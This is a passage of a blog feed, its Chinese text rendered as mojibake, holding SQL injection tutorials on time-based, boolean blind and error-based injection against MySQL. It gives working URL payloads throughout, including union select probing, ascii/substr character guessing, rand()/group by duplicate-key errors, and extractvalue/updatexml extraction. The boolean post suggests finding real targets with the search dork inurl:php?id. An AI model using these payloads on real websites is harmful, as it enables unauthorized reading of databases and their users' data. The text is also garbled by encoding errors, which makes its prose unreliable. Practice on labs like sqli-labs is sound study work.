users)&gt;19,1,benchmark(2000000,sha(&#x27;</span>hello<span class="string">&#x27;))) --+</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä¸€èˆ¬ä½¿ç”¨ benchmark(2000000,sha('hello'));</p><h1 id="æ€»ç»“å›é¡¾">æ€»ç»“å›é¡¾</h1><ol type="1"><li>limit ä¸‹æ ‡æ˜¯ä» 0 å¼€å§‹ï¼Œsubstr ä¸‹æ ‡æ˜¯ä» 1 å¼€å§‹</li></ol>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¸ƒå°”ç›²æ³¨</title>
      <link href="/blog/2019/07/27/websec/sql_injection/boolean_based_sql_injection/"/>
      <url>/blog/2019/07/27/websec/sql_injection/boolean_based_sql_injection/</url>
      
        <content type="html"><![CDATA[<p>é‰´äº sqli-lib less 5 å’Œ webug çš„å¸ƒå°”æ³¨å…¥éƒ½ä¸å¤ªè§„èŒƒï¼Œæˆ‘åˆæ‡’å¾—çœ‹dvwaã€‚äºæ˜¯ï¼Œä»ç½‘ä¸Šæ‰¾äº†ä¸ªæ ‡å‡†çš„å¸ƒå°”ç›²æ³¨çš„ç«™ç‚¹ï¼Œè‡ªå·±æµ‹è¯•äº†ä¸€ä¸‹ï¼Œè¿™é‡Œå°±ä¸åœ¨æ¼”ç¤ºäº†ã€‚ä½ å¯ä»¥ä½¿ç”¨inurl:php?id å»ç™¾åº¦æˆ–è°·æ­Œä¸€äº›ç½‘ç«™çœ‹çœ‹ã€‚</p><h1 id="ç®€ä»‹">ç®€ä»‹</h1><p>åœ¨ <ahref="https://xuj.me/wiki/web_security/sql_injection/boolean_based_of_webug/">webugçš„å¸ƒå°”æ³¨å…¥</a>å·²ç»è°ˆåˆ°äº†</p><h1 id="å¸ƒå°”ç›²æ³¨å¸¸ç”¨å‡½æ•°">å¸ƒå°”ç›²æ³¨å¸¸ç”¨å‡½æ•°</h1><p><ahref="https://www.cnblogs.com/lcamry/p/5504374.htm">å­—ç¬¦ä¸²æˆªå–å‡½æ•°</a></p><h2 id="å¸¸ç”¨æ‘˜æŠ„è‡ªä¸Šé¢é“¾æ¥">å¸¸ç”¨ï¼ˆæ‘˜æŠ„è‡ªä¸Šé¢é“¾æ¥ï¼‰</h2><h3 id="left">left</h3><p>left(stringï¼Œn)å¾—åˆ°å­—ç¬¦ä¸²å·¦éƒ¨æŒ‡å®šä¸ªæ•°çš„å­—ç¬¦ï¼Œä¸€èˆ¬æˆ‘åœ¨çŒœæµ‹å­—ç¬¦ä¸²æ—¶ä½¿ç”¨ï¼Œæ¯”å¦‚ï¼šæœ‰äº›ç½‘ç«™ä¹ æƒ¯äºå°†ä¸€äº›æ•°æ®åº“å/è¡¨åå®šä¹‰æˆè‡ªå·±ç½‘ç«™çš„åå­—æˆ–ç½‘å€å»æ‰ç¬¦å·ï¼Œè¿˜æœ‰ä¸€äº›å¸¸è§çš„å®šä¹‰åº“è¡¨çš„åå­—ï¼Œå¦‚æœæˆ‘é€ä¸ªå­—ç¬¦çŒœäº†å‡ ä¸ªçœ‹åˆ°å’Œé‚£ä¸ªæœ‰åŒ¹é…ï¼Œæˆ‘å°±ç”¨left å°è¯•å»åŒ¹é…ä¸€ä¸‹ï¼Œå½“ç„¶ï¼Œç›´æ¥ç”¨ left ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦çŒœä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p><p>Sql ç”¨ä¾‹ï¼š</p><ol type="1"><li>left(database(), 1)&gt;'a' æŸ¥çœ‹æ•°æ®åº“çš„ç¬¬ä¸€ä½ï¼Œleft(database(),2)&gt;'ab' æŸ¥çœ‹æ•°æ®åº“åå‰äºŒä½ã€‚</li></ol><p>left(version(), 1) &gt; '5'</p><ol start="2" type="1"><li>åŒæ ·çš„ string å¯ä»¥ä¸ºè‡ªè¡Œæ„é€ çš„ sql è¯­å¥ã€‚</li></ol><h3 id="substr">substr</h3><p>substr(string, start, length) ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦å¤„ç†çš„å­—ç¬¦ä¸²ï¼Œstartä¸ºå¼€å§‹ä½ç½®ï¼Œlength ä¸ºæˆªå–çš„é•¿åº¦ã€‚</p><p>Sql ç”¨ä¾‹ï¼š</p><ol type="1"><li>substr(DATABASE(),1,1)&gt;â€™aâ€™,æŸ¥çœ‹æ•°æ®åº“åç¬¬ä¸€ä½ï¼Œsubstr(DATABASE(),2,1)æŸ¥çœ‹æ•°æ®åº“åç¬¬äºŒä½ï¼Œä¾æ¬¡æŸ¥çœ‹å„ä½å­—ç¬¦ã€‚</li></ol><p>ä¸€èˆ¬å°±ç”¨å®ƒæ¥ä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦çš„çŒœã€‚</p><h3 id="regexp-æ­£åˆ™">regexp æ­£åˆ™</h3><p>è¿™é‡Œï¼Œæš‚æ—¶è¿˜æ²¡ç”¨è¿‡ï¼Œçœ‹ä¸‹é¢é“¾æ¥å§ï¼Œç”¨åˆ°å†è¯´ã€‚</p><p><a href="https://www.cnblogs.com/lcamry/articles/5717442.html">sqlç›²æ³¨ä¹‹æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»</a></p><h1 id="æµç¨‹">æµç¨‹</h1><h3 id="çŒœå­—æ®µ">çŒœå­—æ®µ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">10</span> order by <span class="number">14</span>--+</span><br></pre></td></tr></table></figure><h3 id="çœ‹æ˜¾ç¤ºä½">çœ‹æ˜¾ç¤ºä½</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">10</span> UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span> --+</span><br></pre></td></tr></table></figure><p>çœ‹çœ‹æœ‰æ²¡æœ‰æ˜¾ç¤ºä½ï¼Œ<strong><em>ä¸€å®šæ³¨æ„ï¼š</em></strong>æŠŠ id = 10 æ”¹æˆid =-10ï¼Œè®©å‰é¢æŸ¥è¯¢æ— æœ(è¯´é“è¿™é‡Œï¼Œå¤§å£°å“­æ³£..)ï¼Œ<strong>å¦‚æœæœ‰æ˜¾ç¤ºä½å°±æ²¡å¿…è¦ç›²æ³¨äº†</strong>ã€‚</p><p>å¯¹äºå¸ƒå°”ç›²æ³¨æ¥è¯´ï¼Œå½“ç„¶æ˜¯æ²¡æœ‰æ˜¾ç¤ºä½äº†ã€‚</p><h3 id="æ•°æ®åº“ç‰ˆæœ¬">æ•°æ®åº“ç‰ˆæœ¬</h3><p>ç”¨ substr ä¸€ä¸ªä¸ªçŒœæµ‹ï¼Œä¸€èˆ¬ä» 5 å¼€å§‹ï¼Œ5.6 å’Œ 5.7 æ¯”è¾ƒå¸¸è§ï¼Œå½“ç„¶ç”¨ leftä¹Ÿä¸€æ ·ã€‚æ³¨æ„ï¼šç‰ˆæœ¬ä¸­çš„é€—ç‚¹ä¹Ÿç®—ä¸€ä¸ªå­—ç¬¦ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">10</span> <span class="keyword">and</span> <span class="title function_ invoke__">left</span>(<span class="title function_ invoke__">version</span>(),<span class="number">1</span>)=<span class="string">&#x27;5&#x27;</span> --+</span><br><span class="line"></span><br><span class="line">?id=<span class="number">10</span> <span class="keyword">and</span> <span class="title function_ invoke__">left</span>(<span class="title function_ invoke__">version</span>(),<span class="number">3</span>)=<span class="string">&#x27;5.6&#x27;</span> --+</span><br><span class="line"></span><br><span class="line">?id=<span class="number">10</span> <span class="keyword">and</span> <span class="title function_ invoke__">left</span>(<span class="title function_ invoke__">version</span>(),<span class="number">6</span>)=<span class="string">&#x27;5.6.19&#x27;</span> --+</span><br></pre></td></tr></table></figure><h3 id="çŒœå½“å‰æ•°æ®åº“å">çŒœå½“å‰æ•°æ®åº“å</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">10</span> <span class="keyword">and</span> <span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">database</span>(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span> --+</span><br></pre></td></tr></table></figure><p>äºŒåˆ†æ€æƒ³ï¼Œé€šè¿‡çœ‹é¡µé¢æ˜¯å¦æ­£å¸¸ï¼Œä¸€ä¸ªä¸ªçŒœï¼Œé€æ¸é€¼è¿‘ã€‚</p><p>å½“ç„¶ï¼Œå¦‚æœå‰å‡ ä¸ªå­—æ¯ç½‘ç«™åæˆ–å¸¸ç”¨åï¼Œä¸å¦¨ç›´æ¥çŒœæµ‹æ•´ä½“è¯•è¯•ã€‚</p><h3 id="çŒœå½“å‰ç”¨æˆ·å">çŒœå½“å‰ç”¨æˆ·å</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">10</span> <span class="keyword">and</span> <span class="title function_ invoke__">length</span>(<span class="title function_ invoke__">user</span>())&gt;<span class="number">6</span> --+</span><br></pre></td></tr></table></figure><p>æœ‰çš„ç½‘ç«™ä½¿ç”¨ï¼šç½‘ç«™å@localhost çš„å½¢å¼ï¼Œè¿˜æ˜¯ä¸€å¥è¯ï¼Œéšæœºåº”å˜ã€‚</p><h3 id="åº“ä¸­çš„è¡¨çš„ä¸ªæ•°">åº“ä¸­çš„è¡¨çš„ä¸ªæ•°</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">10</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">count</span>(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=<span class="title function_ invoke__">database</span>())&gt;<span class="number">5</span> --+</span><br></pre></td></tr></table></figure><h3 id="çˆ†è¡¨">çˆ†è¡¨</h3><h4 id="çˆ†ç¬¬ä¸€ä¸ªè¡¨çš„é•¿åº¦">çˆ†ç¬¬ä¸€ä¸ªè¡¨çš„é•¿åº¦</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">10</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">length</span>((select table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="title function_ invoke__">database</span>() limit <span class="number">0</span>,<span class="number">1</span>))=<span class="number">9</span>) --+</span><br></pre></td></tr></table></figure><h4 id="çˆ†è¡¨çš„åç§°">çˆ†è¡¨çš„åç§°</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">10</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="title function_ invoke__">database</span>() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span>) --+</span><br></pre></td></tr></table></figure><p>åé¢å°±ä¸è¯¦ç»†è®²äº†ï¼Œå‚è€ƒå›æ˜¾æ³¨å…¥è¯­å¥ä¸ä¸Šé¢è¯­å¥è‡ªå·±æ„é€ å°±å¥½äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åŸºäºæŠ¥é”™çš„ç›²æ³¨</title>
      <link href="/blog/2019/07/27/websec/sql_injection/error_based_sql_injection/"/>
      <url>/blog/2019/07/27/websec/sql_injection/error_based_sql_injection/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸºäºæŠ¥é”™çš„ç›²æ³¨ç®€ä»‹">åŸºäºæŠ¥é”™çš„ç›²æ³¨ç®€ä»‹</h1><p>åˆ©ç”¨çš„æ˜¯ SQLè¯­å¥æŠ¥é”™ä»è€Œå›æ˜¾å‡ºæˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€å¥èƒ½å¤ŸæŠ¥é”™çš„ SQLè¯­å¥ï¼ˆå³ï¼šåœ¨ mysql æ•°æ®åº“ cmdå‘½ä»¤è¡Œä¸­æ‰§è¡Œå°±ä¼šæŠ¥é”™çš„è¯­å¥ï¼Œæ¯”å¦‚ï¼šdoubleã€BigInt æº¢å‡ºï¼Œé‡å¤ï¼Œè¿˜æœ‰ç”±äºmysql è®¾è®¡ç¼ºé™·é€ æˆè‡ªèº«çš„ bug ç­‰ï¼‰</p><p>æŠ¥é”™è¯­å¥å„å¼å„æ ·ï¼Œåƒå¥‡ç™¾æ€ªï¼Œä½ å¯ä»¥è‡ªå·±å»æ‰¾ã€å»å‘ç°ã€‚å½“ç„¶ï¼Œä¹Ÿæœ‰å¤§ç¥ä»¬ç»™æˆ‘ä»¬ç•™ä¸‹æ¥çš„ä¸€äº›è´¢å¯Œã€‚æ„Ÿè§‰è¿™ä¸€éƒ¨åˆ†è¯´éš¾ä¹Ÿéš¾ï¼Œè¯´ç®€å•ä¹Ÿç®€å•ã€‚éš¾æ˜¯å› ä¸ºé‚£äº›æŠ¥é”™æœ‰æ—¶å¹¶ä¸å¥½æ‰¾ï¼Œç”šè‡³å¤§ç¥ä»¬æ‰¾çš„æŠ¥é”™çš„åŸç†å’±ä¹Ÿæä¸æ‡‚ï¼Œç®€å•æ˜¯å› ä¸ºå¯ä»¥ç›´æ¥ç”¨å¤§ç¥æ‰¾çš„å¯ä»¥æŠ¥é”™çš„è¯­å¥ï¼Œæœ‰çš„æŠ¥é”™åŸç†ä¸æ‡‚å°±ä¸æ‡‚äº†ï¼Œä¸å½±å“å’±ä»¬æŠ¥é”™ç›²æ³¨ã€‚</p><p>ä¸‹é¢é™„ä¸Šå‡ ä¸ªé“¾æ¥ï¼Œä¾›åŸºäºæŠ¥é”™çš„ç›²æ³¨ä½¿ç”¨ï¼š</p><p><a href="https://www.cnblogs.com/lcamry/p/5763129.html">MYSQLæ³¨å…¥å¤©ä¹¦ä¹‹ç›²æ³¨è®²è§£</a></p><p><ahref="https://blog.csdn.net/qq_35544379/article/details/77453019">å¤§ç¥å¯¹ä¸€ç§æŠ¥é”™æ–¹å¼åŸç†çš„æ¢ç©¶</a></p><p>å…¸å‹çš„æŠ¥é”™æ³¨å…¥è¯­å¥å»ä¸Šé¢é“¾æ¥æ‰¾å°±è¡Œäº†ã€‚</p><h1 id="å·²çŸ¥çš„æŠ¥é”™æ³¨å…¥æ–¹å¼">å·²çŸ¥çš„æŠ¥é”™æ³¨å…¥æ–¹å¼</h1><p>ä¸‹é¢åªåˆ—å‡ºå‡ ç§è‡ªå·±ä½¿ç”¨ sqli-lib less 5 å¤ç°æˆåŠŸçš„æŠ¥é”™æ³¨å…¥æ–¹å¼</p><h2 id="mysql-bug-865-randå’Œ-group-by-åŒæ—¶ä½¿ç”¨">mysql Bug 865 rand()å’Œgroup by åŒæ—¶ä½¿ç”¨</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,count(*),concat(0x23,(è¦æŸ¥è¯¢çš„è¯­å¥),0x23,floor(rand(0)*2))a from information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure><p>0x23 ä¸º # å¯¹åº” ASCII ç çš„ 16è¿›åˆ¶ï¼Œç”¨æ¥éš”ç¦»çªå‡ºä½ æŸ¥è¯¢çš„å†…å®¹ï¼Œä¾¿äºä½ æ‰¾åˆ°. å¯ä»¥è‡ªå·±å» ASCIIç è¡¨æ‰¾å…¶ä»–çš„å­—ç¬¦æ›´æ¢ï¼Œå»ºè®®ä½¿ç”¨ 16è¿›åˆ¶ï¼Œç›´æ¥ä½¿ç”¨å­—ç¬¦ï¼Œå¯èƒ½æœ‰æ—¶å€™ä¼šè¢«è¿‡æ»¤æ‰ã€‚</p><p>åé¢é‚£ä¸ª from information_schema.columnsä»å“ªä¸ªè¡¨æŸ¥æ²¡å•¥æ„æ€ï¼Œä¸»è¦æ˜¯éœ€è¦åªç”¨ group by è®©å…¶å’Œ rand()å‡½æ•°ä¸€èµ·è¿™æ ·æ‰èƒ½æŠ¥é”™ã€‚</p><p><strong>æˆ‘ä»¬åªéœ€è¦å°†æˆ‘ä»¬çš„å­æŸ¥è¯¢è¯­å¥å†™åœ¨ä¸Šé¢ â€œè¦æŸ¥è¯¢çš„è¯­å¥â€çš„ä½ç½®å³å¯ã€‚</strong></p><p>è¿”å›å€¼ä¸èƒ½è¶…è¿‡ 1 è¡Œæ•°æ®ï¼Œæ‰€ä»¥å¦‚æœé‡Œé¢çš„ select è·å–çš„æ˜¯å¤šè¡Œæ•°æ®æ—¶è¦åŠ limitï¼Œç»æµ‹è¯•æˆ‘ä»¬è¦å†™å­æŸ¥è¯¢ä¸­ä¸èƒ½å«æœ‰ count(), group_concatè¯­å¥ï¼Œå³ï¼šä¸èƒ½è®¡æ•° å’Œ åªèƒ½ limit 0,1 ä¸€æ¡ä¸€æ¡æ¥äº†ã€‚</p><p>ä¸¾ä¾‹ï¼š</p><p>æŸ¥è¯¢æ‰€æœ‰è¡¨æ˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,count(*),concat(0x23,(select schema_name from information_schema.schemata limit 0,1),0x23,floor(rand(0)*2))a from information_schema.tables group by a --+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾ï¼šDuplicate entry '#information_schema#1' for key 'group_key'</p><p>ç„¶åæ”¹æˆ limit 1,1ã€limit 2,1 ç­‰æ…¢æ…¢æµ‹è¯•ã€‚</p><h2 id="double-ç±»å‹æº¢å‡ºæŠ¥é”™">double ç±»å‹æº¢å‡ºæŠ¥é”™</h2><p>æš‚æ— æˆåŠŸå¤ç°çš„</p><h2 id="bigint-æº¢å‡ºæŠ¥é”™">BIGINT æº¢å‡ºæŠ¥é”™</h2><p>æš‚æ— æˆåŠŸå¤ç°çš„</p><h2 id="åˆ©ç”¨-xpath-å‡½æ•°">åˆ©ç”¨ xpath å‡½æ•°</h2><p>MySQL 5.1.5 ç‰ˆæœ¬ä¸­æ·»åŠ äº†å¯¹ XML æ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„å‡½æ•°ï¼Œåˆ†åˆ«æ˜¯extractvalue()å’Œ updatexml()</p><p>ç»æµ‹è¯• mysql 8.0.12ä»å­˜åœ¨è¿™ä¸¤ä¸ªæŠ¥é”™ï¼Œè¿™ä¸¤ä¸ªæŠ¥é”™å‡½æ•°ï¼Œé™¤äº†åè€…å¤šä¸€ä¸ªå‚æ•°å¤–ï¼Œå¾ˆå¤šç‰¹å¾éƒ½æ˜¯ç›¸ä¼¼çš„ï¼Œä¸‹é¢çš„æµ‹è¯•ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œå¯¹è¿™ä¸¤ä¸ªå‡½æ•°éƒ½æ˜¯é€‚ç”¨çš„ã€‚</p><p>è¿”å›å€¼ä¸èƒ½è¶…è¿‡ 1 è¡Œæ•°æ®ï¼Œæ‰€ä»¥å¦‚æœé‡Œé¢çš„ select è·å–çš„æ˜¯å¤šè¡Œæ•°æ®æ—¶è¦åŠ limitï¼Œå¯ä½¿ç”¨ group_concat å‡½æ•°ã€‚</p><h3 id="extractvalue-æŠ¥é”™">extractvalue æŠ¥é”™</h3><p>å‡½æ•°è§£é‡Šï¼š ã€€ã€€ extractvalue()ï¼šä»ç›®æ ‡ XMLä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²ã€‚ ã€€ã€€ EXTRACTVALUE (XML_document,XPath_string); ã€€ã€€ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_document æ˜¯ String æ ¼å¼ï¼Œä¸º XMLæ–‡æ¡£å¯¹è±¡çš„åç§° ã€€ã€€ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpath æ ¼å¼çš„å­—ç¬¦ä¸²)</p><p>æˆ‘ä»¬é€šè¿‡æ§åˆ¶ç¬¬äºŒä¸ªå‚æ•°è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼Œxmlæ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ—¶ï¼Œåº”ä¸º/xxx/xxx/xxxè¿™ç§æ ¼å¼ï¼Œå½“ç¬¬äºŒä¸ªå‚æ•°æ ¼å¼ä¸æ­£ç¡®æ—¶ï¼Œå°±ä¼šäº§ç”Ÿ Xpathè¯­æ³•é”™è¯¯ï¼Œå¹¶è¿”å›æˆ‘ä»¬è¾“å…¥çš„é”™è¯¯è¯­å¥çš„å†…å®¹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(è¦æŸ¥è¯¢çš„è¯­å¥),0x73)) --+</span></span><br></pre></td></tr></table></figure><p>0x7e åŒæ ·ä¹Ÿæ˜¯ç”¨æ¥åŒºåˆ†ä½ çš„æŸ¥è¯¢ç»“æœï¼Œæ”¹æˆ0x23ï¼Œå³ï¼š#ä¹Ÿè¡Œï¼Œä½†æ˜¯ä¸è¦è¾“å…¥è‹±æ–‡å­—ç¬¦çš„åå…­è¿›åˆ¶ï¼Œå»ºè®® concatçš„ç¬¬ä¸€ä¸ªä¸è¦ç”¨æ¥æŸ¥æ•°æ®ï¼Œå†™ä¸ªå­—ç¬¦åˆ†å¼€å°±å¥½ã€‚æ€»ä¹‹ï¼Œå…·ä½“è‡ªå·±æµ‹è¯•ã€‚</p><p>concat å¯ä»¥å†å¤šè¿æ¥æˆ‘ä»¬ select æŸ¥è¯¢çš„ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ concat_ws</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat_ws(0x23,0x23,(select version()),(select database()))) --+</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šæŠ¥é”™å›æ˜¾æœ‰å­—ç¬¦é™åˆ¶ï¼Œæµ‹è¯•ä¸º 32 ä¸ªå­—ç¬¦ã€‚</p><p>æ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat_ws(&#x27;</span>, <span class="string">&#x27;,0x23,(select version()),(select database()),(select user()),(select @@datadir))) --+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾</p><blockquote><p>XPATH syntax error: '#, 5.5.53, security, root@localh'</p></blockquote><h3 id="updatexml-æŠ¥é”™">updatexml æŠ¥é”™</h3><p>UPDATEXML (XML_document, XPath_string, new_value);</p><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_document æ˜¯ String æ ¼å¼ï¼Œä¸º XML æ–‡æ¡£å¯¹è±¡çš„åç§°ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpath æ ¼å¼çš„å­—ç¬¦ä¸²)ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒString æ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</p><p>æŠ¥é”™åŸç†åŒ extractvalue() ç¬¬äºŒä¸ªå‚æ•°è·¯å¾„æ ¼å¼é—®é¢˜ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(ä½ è¦æŸ¥è¯¢çš„è¯­å¥)),1)--+</span></span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œè¿™é‡Œçš„ concat ä¹Ÿå¯ä»¥è¿æ¥å¥½å¤šä¸ªï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select version()),0x7e,(select database())),1)--+</span></span><br></pre></td></tr></table></figure><p>ç”±äºæœ‰å­—ç¬¦ä¸ªæ•°é™åˆ¶ï¼Œä¸€èˆ¬æˆ‘ä½¿ç”¨çš„æœ‰ä¸‹é¢ä¸¤ç§è¯­å¥ï¼Œ</p><ol type="1"><li><p>é€šè¿‡æ”¹å˜ limit çš„ç¬¬ä¸€ä¸ªå‚æ•°æ¥ä¸€æ¡è®°å½•æŸ¥ï¼ˆè€Œä¸ä½¿ç”¨ group_concatå°†æ‰€æœ‰è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼‰</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat_ws(0x23,0x23,(select schema_name from information_schema.schemata limit 0,1))) --+</span><br></pre></td></tr></table></figure></p><p>å›æ˜¾ï¼š</p><blockquote><p>XPATH syntax error: '##information_schema,challenges,'</p></blockquote></li><li><p>å¦‚æœæ¯”è¾ƒå°‘ï¼Œæ¯”å¦‚æŸ¥å‡ºåº“/è¡¨çš„ä¸ªæ•°æ¯”è¾ƒå°‘ä¹‹åï¼Œå¯ä»¥å…ˆè¯•è¯•group_concat æ²¡å‡†è¡¨åå¾ˆå¤šï¼Œå…¨æ˜¾ç¤ºå‡ºæ¥äº†ã€‚å½“ç„¶ï¼Œgroup_concat é‡Œé¢ä¹Ÿæœ‰order by çœ‹ç€æ¥å§ã€‚</p><p>æ¯”å¦‚è¿™é‡ŒæŸ¥å‡ºè¡¨çš„ä¸ªæ•°ä¸º 4 ä¸ª</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat_ws(0x23,0x23,(select count(table_name) from information_schema.tables where table_schema=database()))) --+</span></span><br></pre></td></tr></table></figure></p><p>ä¸‹é¢å…ˆç”¨ group_concat æŸ¥ä¸€ä¸‹çœ‹çœ‹ã€‚</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat_ws(0x23,0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1))) --+</span></span><br></pre></td></tr></table></figure></p><p>å›æ˜¾</p><blockquote><p>XPATH syntax error: '##emails,referers,uagents,users'</p></blockquote><p>åƒè¿™æ ·è¡¨åéƒ½æ¯”è¾ƒçŸ­çš„è¯ï¼Œå°±éƒ½æŸ¥å‡ºæ¥äº†ï¼Œå…·ä½“æ ¹æ®å®é™…æƒ…å†µä½¿ç”¨å§ã€‚</p></li></ol><h2 id="mysql-é‡å¤ç‰¹æ€§">mysql é‡å¤ç‰¹æ€§</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,2 from (select name_const(version(),1),name_const(version(),1))x --+</span></span><br></pre></td></tr></table></figure><p>å‰åä¸¤ä¸ª nameconst çš„å†…å®¹è¦ä¸€æ ·ã€‚åªèƒ½ç”¨æ¥æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬ï¼Œæˆ‘æµ‹è¯•è¿‡database(),user() ç­‰å‡æœªæˆåŠŸã€‚</p><h1 id="è¡¥limit-å‡½æ•°ç®€ä»‹">è¡¥ï¼šlimit å‡½æ•°ç®€ä»‹</h1><p>limit å‡½æ•°çš„ä½¿ç”¨æœ‰ç‚¹å¿˜è®°äº†ï¼Œå†å›é¡¾ä¸€ä¸‹ã€‚</p><p>SELECT column1, column2 FROM tbl_name LIMIT offset , count;</p><ol type="1"><li><p>limit å¯ä»¥æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¼€å§‹ä½ç½®çš„åç§»ï¼Œä» 0å¼€å§‹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æœ€å¤šæ˜¾ç¤ºçš„è®°å½•æ¡æ•°ã€‚</p></li><li><p>limit ä¹Ÿå¯ä»¥æœ‰ä¸€ä¸ªå‚æ•°çš„ç®€å†™å½¢å¼ï¼š limit n; ç›¸å½“äº limit 0,n;ä»ç¬¬ä¸€æ¡å¼€å§‹ï¼Œæœ€å¤šæ˜¾ç¤º n æ¡</p></li><li><p>SELECT * FROM products LIMIT 8 OFFSET 0; (åœ¨ mysql 5ä»¥åæ”¯æŒè¿™ç§å†™æ³•) 